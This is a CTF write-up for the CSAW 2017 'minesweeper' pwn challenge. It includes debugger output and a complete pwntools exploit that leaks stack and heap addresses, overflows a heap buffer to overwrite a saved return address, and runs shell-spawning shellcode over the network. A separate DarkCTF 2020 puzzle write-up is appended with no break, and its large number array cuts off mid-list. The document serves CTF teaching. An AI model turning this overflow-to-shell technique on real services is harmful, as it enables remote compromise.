[](ctf=csaw-quals-2017)  
[](type=exploit)  
[](tags=arbitrary-size)  
[](techniques=shellcode)

# minesweeper (pwn-500)

[Binary](../minesweeper)

```bash  
$ file minesweeper  
minesweeper: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux),
statically linked, stripped  
```

This solution would make you think that this challenge was not worth 500. Lets
solve it without reversing the binary at all. The binary is UPX packed, so we
first unpack it.

```bash  
$ cp minesweeper upx  
$ upx -d upx  
                      Ultimate Packer for eXecutables  
                         Copyright (C) 1996 - 2013  
UPX 3.91        Markus Oberhumer, Laszlo Molnar & John Reiser   Sep 30th 2013

       File size         Ratio      Format      Name  
  --------------------   ------   -----------   -----------  
    13132 <-      7936   60.43%  netbsd/elf386  upx

Unpacked 1 file.  
$ file upx  
upx: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically
linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32,
BuildID[sha1]=90ec16e6be18b19942bf2952db17a7c1ed3ca482, stripped  
$ checksec upx  
   Arch:     i386-32-little  
   RELRO:    No RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      No PIE (0x8048000)  
   RWX:      Has RWX segments  
```

This makes more sense. A pwn worth 500 with no protections??? seriously??  
When we run it it says server started. `netstat` tells the port to be 31337.
The process wais for a connection and then forks.  
I connect to the port and attach gdb to the child.

```bash  
nc 127.0.0.1 31337

Hi. Welcome to Minesweeper. Please select an option:  
1) N (New Game)  
2) Initialize Game(I)  
3) Q (Quit)  
I  
Please enter in the dimensions of the board you would like to set in this
format: B X Y  
B 10 10  
```  
On the binary's STDOUT it said `Allocated buffer of size: 81`.  
The problem is obvious now, it should have allocated 100 bytes instead.  
We can send in our input which will be copied to the buffer, so its probably
an out of bounds write. Using `cyclic` from the awesome pwntools I send a
payload `'XXXX'+cyclic(96)`. It crashed!  
```bash  
Program received signal SIGSEGV, Segmentation fault.  
0x08049855 in ?? ()  
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA  
[────────────────────────────────────REGISTERS─────────────────────────────────────]  
*EAX  0x61616176 ('vaaa')  
*EBX  0x0  
*ECX  0x4  
*EDX  0x61616177 ('waaa')  
EDI  0xf76f8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */  
*ESI  0xf76f8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */  
*EBP  0xffcc5908 —▸ 0xffcc5948 —▸ 0xffcc5998 —▸ 0xffcc59e8 ◂— ...  
*ESP  0xffcc58f0 ◂— 0x0  
*EIP  0x8049855 ◂— mov    dword ptr [eax + 8], edx  
[──────────────────────────────────────DISASM──────────────────────────────────────]  
► 0x8049855    mov    dword ptr [eax + 8], edx  
  0x8049858    mov    eax, dword ptr [ebp + 8]  
  0x804985b    mov    eax, dword ptr [eax + 8]  
  0x804985e    mov    edx, dword ptr [ebp - 0x10]  
  0x8049861    mov    dword ptr [eax + 4], edx  
  0x8049864    mov    eax, dword ptr [stderr]       <0x804bdbc>  
  0x8049869    push   eax  
  0x804986a    push   9  
  0x804986c    push   1  
  0x804986e    push   0x804a87c  
  0x8049873    call   fwrite@plt                    <0x80486a0>  
[──────────────────────────────────────STACK───────────────────────────────────────]  
00:0000│ esp  0xffcc58f0 ◂— 0x0  
01:0004│      0xffcc58f4 —▸ 0xf76f8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al,
0x1d /* 0x1b1db0 */  
02:0008│      0xffcc58f8 ◂— 0x61616176 ('vaaa')  
03:000c│      0xffcc58fc ◂— 0x61616177 ('waaa')  
04:0010│      0xffcc5900 ◂— 0x4  
05:0014│      0xffcc5904 —▸ 0x8f90024 ◂— 0x58585858 ('XXXX')  
06:0018│ ebp  0xffcc5908 —▸ 0xffcc5948 —▸ 0xffcc5998 —▸ 0xffcc59e8 ◂— ...  
07:001c│      0xffcc590c —▸ 0x80499ea ◂— add    esp, 0x10  
[────────────────────────────────────BACKTRACE─────────────────────────────────────]  
► f 0  8049855  
  f 1  80499ea  
  f 2  8049526  
  f 3  80496b0  
  f 4  8049b75  
  f 5  8049d96  
  f 6 f755e637 __libc_start_main+247  
Program received signal SIGSEGV (fault address 0x6161617e)  
pwndbg>  
```

`eax` holds data at offset 88 and `edx` at 92. This would give us a very clean
write-what-where. However there's a catch, contnuing execution to `0x8049861`
shows that another write primitive with `eax`=`edx`. This could fuck up the
clean primitive we had to write as now we need the `what` and `where` regions
to be writable.

The input is saved on a custom heap with rwxp. Come on! Its 2017!  
```  
0x8f90000  0x8f91000 rwxp     1000 0      [heap]  
```  
A straight leak is also available when you view the board in the game. I foud
out that if you view the board without initializing the board, you leak stack
and libc. When you view it with a small initialized board you can leak the
heap. Now its easy!

+ Leak the stack and heap.  
+ Initialize a board large enough to contain our shellcode and calculate save eip on the stack for the function which gives us the write primitive.  
+ Calculate shellcode's location on heap and replace eip with it.

For shellcode I used awesome `pwntools` -
`pwnlib.shellcraft.i386.linux.dupsh()`. It'll take the fd of your socket and
dup() it with stdin and stdout and then give you a shell.

```python  
from pwn import *

context(arch='i386', os='linux', log_level='info')

s = remote('pwn.chal.csaw.io',7478)

for _ in xrange(5):  
   s.recvline()  
s.sendline("N")  
for _ in xrange(4):  
   s.recvline()  
s.sendline("V")  
s.recvline()  
r = s.recv(144)  
print len(r)  
stack = u32(r[91:95])  
success(hex(stack))  
s.sendline("Q")  
for _ in xrange(5):  
   s.recvline()  
s.sendline('I')  
s.recvline()  
s.sendline("B 4 4")  
for _ in xrange(20):  
   s.recvline()  
s.sendline('X'*16)  
for _ in xrange(12):  
   s.recvline()  
s.sendline('N')  
for _ in xrange(4):  
   s.recvline()  
s.sendline('V')  
s.recvline()  
r = s.recv(0x20)  
heap = u32(r[15:19])  
success(hex(heap))  
sleep(5)  
for _ in xrange(5):  
   s.recvline()  
for _ in xrange(5):  
   s.recvline()  
s.sendline("Q")  
for _ in xrange(5):  
   s.recvline()  
s.sendline('I')  
s.recvline()  
s.sendline("B 20 20")  
for _ in xrange(20):  
   s.recvline()

payload = '\xeb\x06'+'X'*4+'\x90'*2+asm('mov
ebp,0x4')+asm(pwnlib.shellcraft.i386.linux.dupsh())  
payload += 'X'*(400-len(payload)-24)  
payload += p32(stack-47-8)+p32(heap+12)+'X'*16

s.sendline(payload)  
s.interactive()  
```

Easiest 500 points I ever scored!  

Original writeup (https://github.com/ByteBandits/writeups/blob/master/csaw-
quals-2017/pwn/minesweeper/sudhackar/README.md).# DarkCTF 2020 – Minesweeper

* **Category:** misc  
* **Points:** 463

## Challenge

> I'm lucky to be surrounded by even-minded people from all around. Flag is
> not in the regular format.  
>  
> Submit flag in darkCTF{flag} format.

## Solution

The challege gives you a [text
file](https://raw.githubusercontent.com/m3ssap0/CTF-
Writeups/master/DarkCTF%202020/Minesweeper/minesweeper).

```  
I'am lucky to be surrounded by even-minded people from all directions.  
Flag is not in the regular format.  
array = [[93, 91, 95, 88, 42, 78, 93, 91, 93, 93, 83, 73, 75, 67, 79, 93, 79,
75, 97, 85, 83, 85, 79, 87, 93, 83, 69, 87, 77, 89, 79, 81, 67, 69, 75, 95,
89, 89, 93, 95], [75, 85, 75, 96, 69, 70, 85, 95, 81, 97, 95, 75, 75, 85, 79,
77, 87, 69, 95, 77, 81, 81, 89, 79, 73, 93, 73, 93, 91, 97, 85, 85, 67, 87,
67, 89, 85, 95, 75, 71], [83, 89, 73, 80, 76, 72, 79, 73, 71, 71, 79, 91, 91,
69, 83, 89, 73, 67, 67, 85, 69, 85, 81, 89, 93, 75, 97, 77, 75, 83, 85, 79,
73, 75, 73, 79, 75, 83, 83, 69], [79, 67, 91, 71, 89, 97, 97, 67, 95, 67, 77,
95, 67, 79, 81, 87, 95, 69, 76, 90, 94, 92, 76, 80, 75, 89, 85, 73, 91, 81,
75, 81, 91, 95, 73, 73, 86, 82, 94, 79], [79, 69, 83, 71, 95, 73, 75, 83, 97,
83, 97, 91, 75, 97, 79, 87, 87, 95, 90, 69, 90, 90, 67, 72, 67, 75, 89, 83,
91, 81, 89, 95, 69, 97, 69, 89, 70, 78, 62, 97], [95, 85, 87, 97, 71, 67, 85,
83, 83, 67, 67, 93, 81, 87, 71, 87, 71, 83, 82, 66, 97, 80, 74, 46, 77, 81,
77, 87, 75, 89, 91, 77, 67, 83, 87, 67, 78, 62, 82, 87], [89, 79, 91, 96, 82,
92, 91, 85, 69, 79, 67, 91, 82, 78, 92, 89, 83, 95, 73, 68, 76, 76, 89, 87,
77, 97, 77, 94, 82, 94, 91, 77, 85, 81, 71, 95, 95, 93, 97, 95], [89, 77, 79,
72, 69, 84, 73, 91, 73, 77, 83, 81, 80, 73, 96, 89, 89, 93, 93, 92, 84, 82,
79, 77, 69, 97, 97, 88, 97, 86, 85, 67, 77, 91, 67, 73, 81, 93, 81, 97], [69,
73, 67, 68, 92, 90, 71, 83, 79, 95, 91, 67, 86, 62, 78, 89, 85, 67, 81, 66,
92, 94, 93, 79, 89, 69, 85, 80, 88, 66, 87, 83, 69, 91, 81, 77, 95, 93, 69,
73], [73, 75, 97, 77, 75, 83, 67, 81, 75, 73, 91, 79, 89, 93, 71, 91, 69, 77,
75, 93, 85, 87, 69, 97, 73, 85, 85, 81, 95, 91, 81, 67, 97, 71, 83, 97, 83,
71, 93, 77], [81, 91, 95, 89, 90, 86, 78, 67, 79, 67, 91, 89, 69, 95, 89, 97,
85, 85, 89, 82, 94, 84, 79, 71, 73, 77, 71, 85, 73, 95, 77, 77, 77, 95, 97,
83, 67, 83, 67, 93], [75, 83, 77, 95, 68, 80, 94, 85, 73, 91, 89, 91, 75, 93,
95, 85, 91, 93, 83, 86, 68, 76, 77, 85, 81, 79, 67, 71, 89, 89, 85, 93, 71,
87, 91, 93, 83, 95, 93, 81], [69, 77, 97, 77, 82, 90, 70, 87, 93, 87, 97, 97,
89, 71, 69, 91, 95, 87, 67, 78, 78, 70, 67, 91, 71, 69, 77, 85, 85, 81, 81,
97, 71, 69, 87, 91, 91, 69, 81, 77], [69, 97, 69, 79, 69, 87, 67, 85, 81, 85,
73, 85, 69, 81, 89, 73, 93, 69, 93, 87, 83, 69, 83, 73, 95, 79, 79, 73, 81,
79, 97, 93, 95, 81, 69, 69, 87, 81, 67, 81], [83, 83, 87, 77, 67, 97, 67, 91,
71, 81, 67, 83, 73, 77, 77, 67, 83, 83, 85, 77, 81, 91, 89, 67, 95, 87, 95,
87, 81, 93, 97, 77, 83, 91, 71, 89, 83, 71, 77, 69], [67, 89, 85, 81, 86, 90,
78, 85, 71, 85, 93, 95, 69, 81, 89, 73, 75, 70, 68, 88, 67, 87, 93, 67, 67,
77, 89, 95, 67, 83, 79, 79, 98, 96, 76, 79, 91, 93, 71, 91], [81, 81, 83, 85,
76, 78, 80, 67, 85, 75, 93, 89, 95, 79, 91, 91, 75, 96, 97, 82, 85, 91, 69,
85, 75, 73, 83, 93, 89, 83, 91, 69, 72, 78, 72, 89, 73, 95, 67, 89], [89, 91,
77, 97, 76, 68, 98, 67, 91, 91, 89, 89, 89, 87, 67, 75, 83, 84, 88, 98, 85,
77, 89, 89, 69, 77, 89, 81, 69, 91, 85, 95, 88, 70, 88, 87, 91, 91, 69, 83],
[83, 84, 60, 82, 79, 91, 95, 67, 69, 73, 67, 97, 77, 75, 93, 71, 73, 75, 95,
87, 75, 95, 73, 93, 95, 80, 82, 88, 85, 77, 73, 75, 69, 95, 85, 77, 68, 78,
92, 81], [71, 42, 79, 86, 97, 75, 75, 81, 79, 87, 85, 87, 73, 81, 87, 75, 91,
67, 91, 67, 93, 77, 87, 91, 67, 76, 73, 72, 97, 83, 95, 73, 71, 69, 79, 89,
92, 84, 82, 69], [67, 78, 74, 88, 77, 91, 67, 85, 87, 97, 69, 89, 69, 85, 85,
89, 81, 67, 97, 91, 71, 85, 91, 85, 75, 98, 82, 70, 69, 79, 75, 97, 97, 85,
95, 97, 94, 80, 64, 79], [73, 81, 79, 79, 71, 97, 79, 77, 93, 79, 95, 85, 85,
95, 79, 91, 77, 91, 81, 67, 93, 75, 89, 87, 67, 77, 93, 89, 67, 77, 77, 77,
91, 77, 67, 81, 79, 73, 87, 91], [93, 92, 82, 88, 85, 95, 69, 79, 93, 89, 67,
72, 76, 88, 85, 77, 81, 87, 75, 83, 75, 95, 97, 77, 91, 93, 87, 87, 88, 62,
90, 85, 79, 93, 75, 89, 85, 64, 62, 98], [83, 82, 97, 62, 91, 77, 81, 67, 85,
67, 87, 88, 86, 94, 77, 89, 73, 77, 67, 81, 75, 95, 87, 79, 85, 77, 93, 89,
74, 82, 78, 77, 79, 89, 83, 95, 77, 70, 69, 94], [85, 94, 92, 90, 71, 71, 89,
83, 77, 73, 93, 72, 98, 90, 83, 97, 89, 93, 95, 91, 77, 95, 93, 93, 69, 75,
75, 69, 74, 78, 72, 85, 97, 69, 83, 75, 75, 88, 90, 72], [73, 67, 82, 74, 66,
87, 85, 89, 71, 97, 77, 93, 81, 69, 78, 82, 92, 81, 81, 91, 67, 71, 79, 79,
69, 81, 84, 82, 88, 91, 85, 69, 95, 84, 70, 88, 89, 81, 71, 77], [95, 87, 94,
83, 84, 69, 69, 97, 79, 73, 69, 91, 83, 89, 80, 66, 84, 93, 97, 77, 77, 91,
83, 69, 91, 91, 80, 79, 98, 91, 67, 91, 91, 70, 69, 72, 89, 77, 71, 83], [93,
83, 94, 78, 82, 78, 66, 74, 79, 95, 93, 89, 79, 87, 90, 74, 76, 85, 67, 93,
77, 81, 67, 83, 90, 70, 72, 86, 76, 91, 79, 89, 71, 82, 72, 88, 91, 67, 67,
95], [85, 89, 73, 95, 83, 72, 86, 70, 91, 81, 81, 69, 87, 97, 97, 77, 77, 77,
87, 97, 91, 81, 93, 69, 66, 97, 84, 89, 89, 95, 77, 71, 85, 91, 95, 75, 67,
97, 71, 71], [81, 97, 75, 67, 73, 92, 74, 78, 81, 91, 75, 93, 73, 75, 87, 95,
67, 83, 75, 71, 97, 91, 89, 71, 82, 80, 82, 87, 77, 95, 91, 93, 79, 73, 73,
69, 75, 75, 93, 79], [89, 71, 87, 89, 76, 70, 88, 83, 91, 73, 83, 91, 91, 93,
76, 84, 62, 75, 91, 69, 97, 93, 73, 95, 75, 73, 77, 67, 81, 72, 88, 80, 73,
73, 87, 75, 73, 75, 91, 95], [75, 67, 87, 79, 72, 72, 96, 69, 85, 85, 81, 95,
81, 81, 76, 85, 80, 97, 75, 77, 91, 79, 75, 91, 73, 69, 81, 77, 81, 98, 79,
62, 87, 85, 69, 89, 67, 97, 67, 81], [77, 85, 73, 77, 82, 74, 90, 95, 69, 81,
71, 69, 73, 83, 80, 88, 84, 73, 75, 87, 70, 68, 84, 77, 83, 83, 77, 71, 85,
86, 80, 84, 93, 89, 73, 69, 85, 89, 91, 79], [81, 77, 87, 69, 87, 95, 69, 79,
69, 71, 71, 75, 91, 93, 97, 95, 83, 81, 67, 83, 92, 89, 96, 95, 97, 93, 81,
79, 71, 69, 93, 75, 89, 71, 77, 69, 91, 97, 79, 69], [69, 87, 87, 85, 69, 83,
85, 77, 97, 89, 83, 67, 73, 83, 82, 74, 64, 95, 93, 87, 72, 68, 80, 92, 68,
92, 87, 85, 91, 85, 79, 91, 97, 97, 71, 93, 85, 89, 85, 85], [85, 81, 77, 95,
81, 89, 77, 73, 85, 87, 71, 73, 83, 95, 92, 83, 68, 71, 73, 69, 87, 81, 97,
72, 73, 98, 91, 89, 81, 71, 85, 77, 95, 95, 69, 81, 77, 79, 67, 97], [69, 93,
75, 97, 67, 93, 77, 67, 75, 77, 79, 89, 71, 67, 76, 94, 80, 75, 81, 95, 67,
75, 71, 90, 74, 76, 87, 79, 71, 73, 79, 75, 73, 87, 81, 91, 95, 75, 95, 69],
[67, 85, 87, 72, 66, 82, 95, 69, 87, 73, 91, 93, 72, 70, 92, 83, 93, 89, 95,
67, 72, 76, 78, 85, 87, 97, 91, 75, 89, 85, 83, 85, 77, 89, 94, 80, 78, 69,
77, 95], [71, 95, 73, 76, 71, 66, 67, 97, 95, 75, 95, 87, 70, 97, 80, 77, 91,
91, 95, 87, 82, 76, 66, 93, 97, 69, 71, 91, 83, 89, 67, 93, 77, 85, 62, 70,
78, 97, 81, 93], [85, 97, 87, 72, 86, 92, 97, 79, 67, 73, 69, 81, 92, 90, 82,
79, 77, 77, 67, 81, 80, 66, 78, 75, 81, 83, 69, 83, 67, 89, 97, 93, 95, 95,
76, 78, 70, 97, 83, 55], [93, 69, 87, 103, 99, 127, 65, 107, 93, 113, 97, 81,
125, 127, 103, 97, 71, 125, 111, 127, 101, 73, 127, 93, 83, 105, 97, 119, 113,
109, 73, 81, 101, 83, 73, 87, 71, 93, 73, 67], [101, 115, 65, 83, 95, 95, 109,
123, 89, 83, 97, 107, 101, 123, 123, 71, 71, 87, 75, 73, 65, 121, 67, 77, 87,
73, 69, 99, 87, 99, 125, 81, 79, 65, 127, 101, 117, 95, 115, 95], [107, 99,
83, 75, 113, 109, 71, 127, 127, 85, 71, 125, 67, 69, 113, 111, 79, 111, 123,
113, 93, 107, 127, 113, 105, 73, 65, 67, 91, 113, 87, 113, 79, 89, 105, 95,
73, 95, 79, 71], [117, 115, 93, 69, 85, 65, 83, 101, 75, 127, 99, 93, 99, 113,
81, 91, 77, 93, 81, 87, 117, 93, 109, 121, 105, 127, 85, 79, 79, 117, 79, 125,
125, 69, 117, 95, 73, 121, 107, 107], [117, 115, 93, 69, 85, 65, 83, 101, 75,
127, 99, 93, 99, 113, 81, 91, 77, 93, 81, 87, 117, 93, 109, 121, 105, 127, 85,
79, 79, 117, 79, 125, 125, 69, 117, 95, 73, 121, 107, 107], [117, 115, 93, 69,
85, 65, 83, 101, 75, 127, 99, 93, 99, 113, 81, 91, 77, 93, 81, 87, 117, 93,
109, 121, 105, 127, 85, 79, 79, 117, 79, 125, 125, 69, 117, 95, 73, 121, 107,
107], [117, 115, 93, 69, 85, 65, 83, 101, 75, 127, 99, 93, 99, 113, 81, 91,
77, 93, 81, 87, 117, 93, 109, 121, 105, 127, 85, 79, 79, 117, 79, 125, 125,
69, 117, 95, 73, 121, 107, 107], [93, 69, 87, 103, 99, 127, 65, 107, 93, 113,
97, 81, 125, 127, 103, 97, 71, 125, 111, 127, 101, 73, 127, 93, 83, 105, 97,
119, 113, 109, 73, 81, 101, 83, 73, 87, 71, 93, 73, 67], [93, 69, 87, 103, 99,
127, 65, 107, 93, 113, 97, 81, 125, 127, 103, 97, 71, 125, 111, 127, 101, 73,
127, 93, 83, 105, 97, 119, 113, 109, 73, 81, 101, 83, 73, 87, 71, 93, 73, 67],
[93, 69, 87, 103, 99, 127, 65, 107, 93, 113, 97, 81, 125, 127, 103, 97, 71,
125, 111, 127, 101, 73, 127, 93, 83, 105, 97, 119, 113, 109, 73, 81, 101, 83,
73, 87, 71, 93, 73, 67], [93, 69, 87, 103, 99, 127, 65, 107, 93, 113, 97, 81,
125, 127, 103, 97, 71, 125, 111, 127, 101, 73, 127, 93, 83, 105, 97, 119, 113,
109, 73, 81, 101, 83, 73, 87, 71, 93, 73, 67], [93, 69, 87, 103, 99, 127, 65,
107, 93, 113, 97, 81, 125, 127, 103, 97, 71, 125, 111, 127, 101, 73, 127, 93,
83, 105, 97, 119, 113, 109, 73, 81, 101, 83, 73, 87, 71, 93, 73, 67]]  
```

The file contains a hint and a bi-directional array. You have to check for
each position in the array all the numbers in the sorrounding, considering
only values sorrounded by *even* numbers.

You can write a [script](https://raw.githubusercontent.com/m3ssap0/CTF-
Writeups/master/DarkCTF%202020/Minesweeper/minesweeper.py) to solve it.

```python  
array = [[93, 91, 95, 88, 42, 78, 93, 91, 93, 93, 83, 73, 75, 67, 79, 93, 79,
75, 97, 85, 83, 85, 79, 87, 93, 83, 69, 87, 77, 89, 79, 81, 67, 69, 75, 95,
89, 89, 93, 95], [75, 85, 75, 96, 69, 70, 85, 95, 81, 97, 95, 75, 75, 85, 79,
77, 87, 69, 95, 77, 81, 81, 89, 79, 73, 93, 73, 93, 91, 97, 85, 85, 67, 87,
67, 89, 85, 95, 75, 71], [83, 89, 73, 80, 76, 72, 79, 73, 71, 71, 79, 91, 91,
69, 83, 89, 73, 67, 67, 85, 69, 85, 81, 89, 93, 75, 97, 77, 75, 83, 85, 79,
73, 75, 73, 79, 75, 83, 83, 69], [79, 67, 91, 71, 89, 97, 97, 67, 95, 67, 77,
95, 67, 79, 81, 87, 95, 69, 76, 90, 94, 92, 76, 80, 75, 89, 85, 73, 91, 81,
75, 81, 91, 95, 73, 73, 86, 82, 94, 79], [79, 69, 83, 71, 95, 73, 75, 83, 97,
83, 97, 91, 75, 97, 79, 87, 87, 95, 90, 69, 90, 90, 67, 72, 67, 75, 89, 83,
91, 81, 89, 95, 69, 97, 69, 89, 70, 78, 62, 97], [95, 85, 87, 97, 71, 67, 85,
83, 83, 67, 67, 93, 81, 87, 71, 87, 71, 83, 82, 66, 97, 80, 74, 46, 77, 81,
77, 87, 75, 89, 91, 77, 67, 83, 87, 67, 78, 62, 82, 87], [89, 79, 91, 96, 82,
92, 91, 85, 69, 79, 67, 91, 82, 78, 92, 89, 83, 95, 73, 68, 76, 76, 89, 87,
77, 97, 77, 94, 82, 94, 91, 77, 85, 81, 71, 95, 95, 93, 97, 95], [89, 77, 79,
72, 69, 84, 73, 91, 73, 77, 83, 81, 80, 73, 96, 89, 89, 93, 93, 92, 84, 82,
79, 77, 69, 97, 97, 88, 97, 86, 85, 67, 77, 91, 67, 73, 81, 93, 81, 97], [69,
73, 67, 68, 92, 90, 71, 83, 79, 95, 91, 67, 86, 62, 78, 89, 85, 67, 81, 66,
92, 94, 93, 79, 89, 69, 85, 80, 88, 66, 87, 83, 69, 91, 81, 77, 95, 93, 69,
73], [73, 75, 97, 77, 75, 83, 67, 81, 75, 73, 91, 79, 89, 93, 71, 91, 69, 77,
75, 93, 85, 87, 69, 97, 73, 85, 85, 81, 95, 91, 81, 67, 97, 71, 83, 97, 83,
71, 93, 77], [81, 91, 95, 89, 90, 86, 78, 67, 79, 67, 91, 89, 69, 95, 89, 97,
85, 85, 89, 82, 94, 84, 79, 71, 73, 77, 71, 85, 73, 95, 77, 77, 77, 95, 97,
83, 67, 83, 67, 93], [75, 83, 77, 95, 68, 80, 94, 85, 73, 91, 89, 91, 75, 93,
95, 85, 91, 93, 83, 86, 68, 76, 77, 85, 81, 79, 67, 71, 89, 89, 85, 93, 71,
87, 91, 93, 83, 95, 93, 81], [69, 77, 97, 77, 82, 90, 70, 87, 93, 87, 97, 97,
89, 71, 69, 91, 95, 87, 67, 78, 78, 70, 67, 91, 71, 69, 77, 85, 85, 81, 81,
97, 71, 69, 87, 91, 91, 69, 81, 77], [69, 97, 69, 79, 69, 87, 67, 85, 81, 85,
73, 85, 69, 81, 89, 73, 93, 69, 93, 87, 83, 69, 83, 73, 95, 79, 79, 73, 81,
79, 97, 93, 95, 81, 69, 69, 87, 81, 67, 81], [83, 83, 87, 77, 67, 97, 67, 91,
71, 81, 67, 83, 73, 77, 77, 67, 83, 83, 85, 77, 81, 91, 89, 67, 95, 87, 95,
87, 81, 93, 97, 77, 83, 91, 71, 89, 83, 71, 77, 69], [67, 89, 85, 81, 86, 90,
78, 85, 71, 85, 93, 95, 69, 81, 89, 73, 75, 70, 68, 88, 67, 87, 93, 67, 67,
77, 89, 95, 67, 83, 79, 79, 98, 96, 76, 79, 91, 93, 71, 91], [81, 81, 83, 85,
76, 78, 80, 67, 85, 75, 93, 89, 95, 79, 91, 91, 75, 96, 97, 82, 85, 91, 69,
85, 75, 73, 83, 93, 89, 83, 91, 69, 72, 78, 72, 89, 73, 95, 67, 89], [89, 91,
77, 97, 76, 68, 98, 67, 91, 91, 89, 89, 89, 87, 67, 75, 83, 84, 88, 98, 85,
77, 89, 89, 69, 77, 89, 81, 69, 91, 85, 95, 88, 70, 88, 87, 91, 91, 69, 83],
[83, 84, 60, 82, 79, 91, 95, 67, 69, 73, 67, 97, 77, 75, 93, 71, 73, 75, 95,
87, 75, 95, 73, 93, 95, 80, 82, 88, 85, 77, 73, 75, 69, 95, 85, 77, 68, 78,
92, 81], [71, 42, 79, 86, 97, 75, 75, 81, 79, 87, 85, 87, 73, 81, 87, 75, 91,
67, 91, 67, 93, 77, 87, 91, 67, 76, 73, 72, 97, 83, 95, 73, 71, 69, 79, 89,
92, 84, 82, 69], [67, 78, 74, 88, 77, 91, 67, 85, 87, 97, 69, 89, 69, 85, 85,
89, 81, 67, 97, 91, 71, 85, 91, 85, 75, 98, 82, 70, 69, 79, 75, 97, 97, 85,
95, 97, 94, 80, 64, 79], [73, 81, 79, 79, 71, 97, 79, 77, 93, 79, 95, 85, 85,
95, 79, 91, 77, 91, 81, 67, 93, 75, 89, 87, 67, 77, 93, 89, 67, 77, 77, 77,
91, 77, 67, 81, 79, 73, 87, 91], [93, 92, 82, 88, 85, 95, 69, 79, 93, 89, 67,
72, 76, 88, 85, 77, 81, 87, 75, 83, 75, 95, 97, 77, 91, 93, 87, 87, 88, 62,
90, 85, 79, 93, 75, 89, 85, 64, 62, 98], [83, 82, 97, 62, 91, 77, 81, 67, 85,
67, 87, 88, 86, 94, 77, 89, 73, 77, 67, 81, 75, 95, 87, 79, 85, 77, 93, 89,
74, 82, 78, 77, 79, 89, 83, 95, 77, 70, 69, 94], [85, 94, 92, 90, 71, 71, 89,
83, 77, 73, 93, 72, 98, 90, 83, 97, 89, 93, 95, 91, 77, 95, 93, 93, 69, 75,
75, 69, 74, 78, 72, 85, 97, 69, 83, 75, 75, 88, 90, 72], [73, 67, 82, 74, 66,
87, 85, 89, 71, 97, 77, 93, 81, 69, 78, 82, 92, 81, 81, 91, 67, 71, 79, 79,
69, 81, 84, 82, 88, 91, 85, 69, 95, 84, 70, 88, 89, 81, 71, 77], [95, 87, 94,
83, 84, 69, 69, 97, 79, 73, 69, 91, 83, 89, 80, 66, 84, 93, 97, 77, 77, 91,
83, 69, 91, 91, 80, 79, 98, 91, 67, 91, 91, 70, 69, 72, 89, 77, 71, 83], [93,
83, 94, 78, 82, 78, 66, 74, 79, 95, 93, 89, 79, 87, 90, 74, 76, 85, 67, 93,
77, 81, 67, 83, 90, 70, 72, 86, 76, 91, 79, 89, 71, 82, 72, 88, 91, 67, 67,
95], [85, 89, 73, 95, 83, 72, 86, 70, 91, 81, 81, 69, 87, 97, 97, 77, 77, 77,
87, 97, 91, 81, 93, 69, 66, 97, 84, 89, 89, 95, 77, 71, 85, 91, 95, 75, 67,
97, 71, 71], [81, 97, 75, 67, 73, 92, 74, 78, 81, 91, 75, 93, 73, 75, 87, 95,
67, 83, 75, 71, 97, 91, 89, 71, 82, 80, 82, 87, 77, 95, 91, 93, 79, 73, 73,
69, 75, 75, 93, 79], [89, 71, 87, 89, 76, 70, 88, 83, 91, 73, 83, 91, 91, 93,
76, 84, 62, 75, 91, 69, 97, 93, 73, 95, 75, 73, 77, 67, 81, 72, 88, 80, 73,
73, 87, 75, 73, 75, 91, 95], [75, 67, 87, 79, 72, 72, 96, 69, 85, 85, 81, 95,
81, 81, 76, 85, 80, 97, 75, 77, 91, 79, 75, 91, 73, 69, 81, 77, 81, 98, 79,
62, 87, 85, 69, 89, 67, 97, 67, 81], [77, 85, 73, 77, 82, 74, 90, 95, 69, 81,
71, 69, 73, 83, 80, 88, 84, 73, 75, 87, 70, 68, 84, 77, 83, 83, 77, 71, 85,
86, 80, 84, 93, 89, 73, 69, 85, 89, 91, 79], [81, 77, 87, 69, 87, 95, 69, 79,
69, 71, 71, 75, 91, 93, 97, 95, 83, 81, 67, 83, 92, 89, 96, 95, 97, 93, 81,
79, 71, 69, 93, 75, 89, 71, 77, 69, 91, 97, 79, 69], [69, 87, 87, 85, 69, 83,
85, 77, 97, 89, 83, 67, 73, 83, 82, 74, 64, 95, 93, 87, 72, 68, 80, 92, 68,
92, 87, 85, 91, 85, 79, 91, 97, 97, 71, 93, 85, 89, 85, 85], [85, 81, 77, 95,
81, 89, 77, 73, 85, 87, 71, 73, 83, 95, 92, 83, 68, 71, 73, 69, 87, 81, 97,
72, 73, 98, 91, 89, 81, 71, 85, 77, 95, 95, 69, 81, 77, 79, 67, 97], [69, 93,
75, 97, 67, 93, 77, 67, 75, 77, 79, 89, 71, 67, 76, 94, 80, 75, 81, 95, 67,
75, 71, 90, 74, 76, 87, 79, 71, 73, 79, 75, 73, 87, 81, 91, 95, 75, 95, 69],
[67, 85, 87, 72, 66, 82, 95, 69, 87, 73, 91, 93, 72, 70, 92, 83, 93, 89, 95,
67, 72, 76, 78, 85, 87, 97, 91, 75, 89, 85, 83, 85, 77, 89, 94, 80, 78, 69,
77, 95], [71, 95, 73, 76, 71, 66, 67, 97, 95, 75, 95, 87, 70, 97, 80, 77, 91,
91, 95, 87, 82, 76, 66, 93, 97, 69, 71, 91, 83, 89, 67, 93, 77, 85, 62, 70,
78, 97, 81, 93], [85, 97, 87, 72, 86, 92, 97, 79, 67, 73, 69, 81, 92, 90, 82,
79, 77, 77, 67, 81, 80, 66, 78, 75, 81, 83, 69, 83, 67, 89, 97, 93, 95, 95,
76, 78, 70, 97, 83, 55], [93, 69, 87, 103, 99, 127, 65, 107, 93, 113, 97, 81,
125, 127, 103, 97, 71, 125, 111, 127, 101, 73, 127, 93, 83, 105, 97, 119, 113,
109, 73, 81, 101, 83, 73, 87, 71, 93, 73, 67], [101, 115, 65, 83, 95, 95, 109,
123, 89, 83, 97, 107, 101, 123, 123, 71, 71, 87, 75, 73, 65, 121, 67, 77, 87,
73, 69, 99, 87, 99, 125, 81, 79, 65, 127, 101, 117, 95, 115, 95], [107, 99,
